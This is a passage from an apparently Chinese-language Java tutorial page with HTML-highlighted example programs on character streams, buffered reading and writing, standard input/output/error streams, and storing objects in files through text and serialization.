java.io.OutputStreamWriter;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  字符流写数据</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//构造字符输出流对象</span><br>        <span class="hljs-type">OutputStreamWriter</span> <span class="hljs-variable">osw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>));<span class="hljs-comment">//覆盖写</span><br><span class="hljs-comment">//        OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(&quot;./myTest.txt&quot;,true));//追加写</span><br><br>        <span class="hljs-comment">//写一个字符</span><br><span class="hljs-comment">//        osw.write(65);</span><br><span class="hljs-comment">//        osw.write(&#x27;Z&#x27;);</span><br><br>        <span class="hljs-comment">//写一个字符串</span><br><span class="hljs-comment">//        osw.write(&quot;你好，JavaSE！&quot;);</span><br><span class="hljs-comment">//        osw.write(&quot;1234567890&quot;,2,6);//写字符串中一部分内容，参数二：起始位置  参数三：写数据的长度</span><br><br>        <span class="hljs-comment">//写一个字符数组</span><br>        <span class="hljs-type">char</span>[] chs = &#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>&#125;;<br><span class="hljs-comment">//        osw.write(chs);//写一整个char数组</span><br>        osw.write(chs,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>);<br><br>        osw.close();<span class="hljs-comment">//关闭流</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="d994138b"></a></p><h3 id="3-2-字符输入流读数据"><a href="#3-2-字符输入流读数据" class="headerlink" title="3.2 - 字符输入流读数据"></a>3.2 - 字符输入流读数据</h3><ul><li><code>InputStreamReader</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  字符输入流读数据</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//构造字符输入流对象</span><br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">isr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>));<br><br>        <span class="hljs-comment">//使用循环，一次读取一个字符</span><br><span class="hljs-comment">//        int ch;//用来存储字符编码</span><br><span class="hljs-comment">//        while ((ch = isr.read()) != -1)&#123;</span><br><span class="hljs-comment">//            System.out.print((char) ch);</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-comment">//一次读取一个数组</span><br>        <span class="hljs-type">char</span>[] chs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> len;<br>        <span class="hljs-keyword">while</span> ((len = isr.read(chs)) != -<span class="hljs-number">1</span>)&#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(chs,<span class="hljs-number">0</span>,len));<br>        &#125;<br><br>        isr.close();<span class="hljs-comment">//关闭流</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="3af12da4"></a></p><h3 id="3-3-字符流的文本拷贝"><a href="#3-3-字符流的文本拷贝" class="headerlink" title="3.3 - 字符流的文本拷贝"></a>3.3 - 字符流的文本拷贝</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  字符流的文本拷贝</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//构造字符输入输出流对象</span><br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">isr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>));<br>        <span class="hljs-type">OutputStreamWriter</span> <span class="hljs-variable">osw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./newTest.txt&quot;</span>));<br><br>        <span class="hljs-comment">//一次读写单个字符</span><br><span class="hljs-comment">//        int ch;//存储字符编码</span><br><span class="hljs-comment">//        while ((ch = isr.read()) != -1) &#123;//读一个字符</span><br><span class="hljs-comment">//            osw.write(ch);//写一个字符</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-comment">//一次读写单个字符数组</span><br>        <span class="hljs-type">char</span>[] chs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> len;<span class="hljs-comment">//存储读取到的数据的长度</span><br>        <span class="hljs-keyword">while</span> ((len = isr.read(chs)) != -<span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//读一个数组</span><br>            osw.write(chs,<span class="hljs-number">0</span>,len);<span class="hljs-comment">//写个一个数组</span><br>        &#125;<br><br>        <span class="hljs-comment">//关闭流</span><br>        isr.close();<br>        osw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="b0a6314f"></a></p><h3 id="3-4-字符流的简化写法"><a href="#3-4-字符流的简化写法" class="headerlink" title="3.4 - 字符流的简化写法"></a>3.4 - 字符流的简化写法</h3><p><code>FileReader FileWriter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  字符流的简化写法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//字符流的正常写法</span><br><span class="hljs-comment">//        InputStreamReader isr = new InputStreamReader(new FileInputStream(&quot;./a.txt&quot;));</span><br><span class="hljs-comment">//        OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(&quot;./a.txt&quot;));</span><br>        <span class="hljs-comment">//通过简化方式构造字符输出输入流对象</span><br>        <span class="hljs-type">FileReader</span> <span class="hljs-variable">fr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>);<br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;./newTest.txt&quot;</span>);<br><br>        <span class="hljs-comment">//一次读写一个字符</span><br><span class="hljs-comment">//        int ch;</span><br><span class="hljs-comment">//        while ((ch = fr.read()) != -1)&#123;//读一个字符</span><br><span class="hljs-comment">//            fw.write(ch);//写一个字符</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-comment">//一次读写一个数组</span><br>        <span class="hljs-type">char</span>[] chs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> len;<br>        <span class="hljs-keyword">while</span> ((len = fr.read(chs)) != -<span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//读一个数组</span><br>            fw.write(chs,<span class="hljs-number">0</span>,len);<span class="hljs-comment">//写一个数组</span><br>        &#125;<br><br>        <span class="hljs-comment">//关闭流</span><br>        fr.close();<br>        fw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="72486787"></a></p><h3 id="3-5-缓冲区高效读写"><a href="#3-5-缓冲区高效读写" class="headerlink" title="3.5 - 缓冲区高效读写"></a>3.5 - 缓冲区高效读写</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>BufferedReader(Reader reader)</code></td><td>根据参数构造缓冲区字符输入流对象</td></tr><tr><td><code>BufferedWriter(Writer writer)</code></td><td>根据参数构造缓冲区字符输出流对象</td></tr></tbody></table><ul><li><p>缓冲区字符流特有方法</p><ul><li><p><code>BufferedWriter</code>  - <code>void newLine()</code> 插入换行符<br> <br>                - <code>void flush()</code>  刷新输出流</p></li><li><p><code>BufferedReader</code> - <code>String readLine()</code>读取一行</p></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  缓冲区高效读写</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//构造缓冲区字符输入流对象</span><br><span class="hljs-comment">//        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(&quot;./myTest.txt&quot;)));</span><br>        <span class="hljs-comment">//构造缓冲区字符输出流对象</span><br><span class="hljs-comment">//        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(&quot;./newTest.txt&quot;)));</span><br><br>        <span class="hljs-comment">//简单方法</span><br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>));<br>        <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;./newTest.txt&quot;</span>));<br><br>        String line;<span class="hljs-comment">//用来存储读取出来的一行数据的</span><br>        <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>)&#123;<span class="hljs-comment">//如果读不到数据说明读到了文件的末尾，并且返回null</span><br>            bw.write(line);<span class="hljs-comment">//写一行</span><br>            bw.newLine();<span class="hljs-comment">//换一行</span><br>            bw.flush();<span class="hljs-comment">//刷新流</span><br>        &#125;<br><br>        <span class="hljs-comment">//关闭流</span><br>        br.close();<br><span class="hljs-comment">//        bw.close();//释放资源的同时，也会有刷新流的动作</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="73fe3001"></a></p><h2 id="4-标准输入-输出-错误流"><a href="#4-标准输入-输出-错误流" class="headerlink" title="4 - 标准输入&#x2F;输出&#x2F;错误流"></a>4 - 标准输入&#x2F;输出&#x2F;错误流</h2><ul><li>System.in</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  标准输入流  System.in</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><span class="hljs-comment">//        String line = new Scanner(System.in).nextLine();</span><br><span class="hljs-comment">//        System.out.println(line);</span><br><br><span class="hljs-comment">//        InputStream in = System.in;//字节流</span><br><span class="hljs-comment">//        InputStreamReader isr = new InputStreamReader(in);//字符流</span><br><span class="hljs-comment">//        BufferedReader br = new BufferedReader(isr);//将普通字符流包装成缓冲区字符输入流</span><br><br>        <span class="hljs-comment">//自己将标准输入流封装成缓冲区字符输入流</span><br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>        <span class="hljs-comment">//创建缓冲区字符输出流对象与文件向关联</span><br>        <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>));<br><br>        String str;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-keyword">if</span>((str = br.readLine()).equals(<span class="hljs-string">&quot;over&quot;</span>))&#123;<br>                <span class="hljs-keyword">break</span>;<span class="hljs-comment">//退出循环</span><br>            &#125;<br><br>            bw.write(str);<span class="hljs-comment">//写一行</span><br>            bw.newLine();<span class="hljs-comment">//插入换行符</span><br>            bw.flush();<span class="hljs-comment">//刷新流</span><br>        &#125;<br><br>        <span class="hljs-comment">//关闭流</span><br>        br.close();<br>        bw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>System.out</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.OutputStreamWriter;<br><span class="hljs-keyword">import</span> java.io.PrintStream;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  标准输出流  System.out</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;正常打印&quot;</span>);<br><br>        <span class="hljs-type">PrintStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> System.out;<span class="hljs-comment">//字节流</span><br>        <span class="hljs-comment">//字节通过缓冲区字符流封装的标准输出流</span><br>        <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(System.out));<br><br>        bw.write(<span class="hljs-string">&quot;Hello JavaSE!&quot;</span>);<br><br>        bw.close();<span class="hljs-comment">//关闭流，刷新流</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>System.err</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  标准错误流  System.err</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo08</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;标准输出流&quot;</span>);<br>        System.err.println(<span class="hljs-string">&quot;标准错误流&quot;</span>);<span class="hljs-comment">//输出优先级高于普通输出流，但并不绝对，</span><br><br>        <span class="hljs-comment">//尝试着自己封装</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="218fbe9b"></a></p><h2 id="5-对象的持久化存储"><a href="#5-对象的持久化存储" class="headerlink" title="5 - 对象的持久化存储"></a>5 - 对象的持久化存储</h2><p><a name="41cb1b73"></a></p><h3 id="5-1-通过之前学过的知识去做对象的持久化存储"><a href="#5-1-通过之前学过的知识去做对象的持久化存储" class="headerlink" title="5.1 - 通过之前学过的知识去做对象的持久化存储"></a>5.1 - 通过之前学过的知识去做对象的持久化存储</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  通过之前学过的知识完成对象的持久化存储的工作</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><span class="hljs-comment">//        mySave();//存对象中的内容</span><br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">newStu</span> <span class="hljs-operator">=</span> myLoad();<span class="hljs-comment">//加载对象</span><br>        System.out.println(newStu);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将文件中的对象信息加载出来</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Student <span class="hljs-title function_">myLoad</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//构造缓冲区字符输入流对象</span><br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> br.readLine();<span class="hljs-comment">//  Andy##18</span><br>        <span class="hljs-comment">//拆分字符串</span><br>        String[] sp = str.split(<span class="hljs-string">&quot;##&quot;</span>); <span class="hljs-comment">// sp[0]:姓名  sp[1]:年龄</span><br><br>        br.close();<span class="hljs-comment">//关闭流并释放资源</span><br><br>        <span class="hljs-comment">//将学生信息组成新的学生对象并进行返回</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(sp[<span class="hljs-number">0</span>],Integer.parseInt(sp[<span class="hljs-number">1</span>]));<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 将一个自定义的对象存储到文件中</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mySave</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">stu</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Andy&quot;</span>, <span class="hljs-number">18</span>);<span class="hljs-comment">//构造学生对象</span><br>        <span class="hljs-comment">//自己封装一个缓冲区字符输出流对象</span><br>        <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>)));<br><br>        <span class="hljs-comment">//将学生姓名和年龄分别取出后写入到文件中</span><br>        bw.write(stu.getName() + <span class="hljs-string">&quot;##&quot;</span> + stu.getAge());<br><br>        bw.close();<span class="hljs-comment">//关闭流并释放资源</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="e6f533f2"></a></p><h3 id="5-2-对象的序列化操作"><a href="#5-2-对象的序列化操作" class="headerlink" title="5.2 -  对象的序列化操作"></a>5.2 -  对象的序列化操作</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>ObjectOutputStream(OutputStream out)</code></td><td>通过参数构造序列化对象（写）</td></tr><tr><td><code>ObjectInputStream(InputStream in)</code></td><td>通过参数构造反序列化对象（读）</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  使用对象的序列化工具进行对象的存取</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span 